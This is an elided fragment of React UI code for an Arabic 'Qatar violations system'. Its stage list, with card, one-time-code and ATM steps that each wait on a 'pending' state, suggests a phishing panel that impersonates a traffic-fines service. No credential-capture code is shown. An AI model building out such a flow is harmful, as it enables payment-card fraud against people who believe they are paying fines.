...
type Stage = "home" | "inquiry" | "results" | "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";
    ...
    <div className="min-h-screen bg-gray-50" dir="rtl">
      ...
      <header className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between shadow-sm">
        ...
        <div className="flex items-center gap-3">
          ...
          <div>
            <h1 className="text-gray-800 font-bold text-sm leading-tight">نظام مخالفات قطر</h1>
                      ...
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-1.5">
                          <span className="text-blue-600 text-xs font-semibold whitespace-nowrap">
                            {s.totalAmount ? `${s.totalAmount} ر.ق` : "-"}
                          </span>
                          {s.statusRead === 0 && (
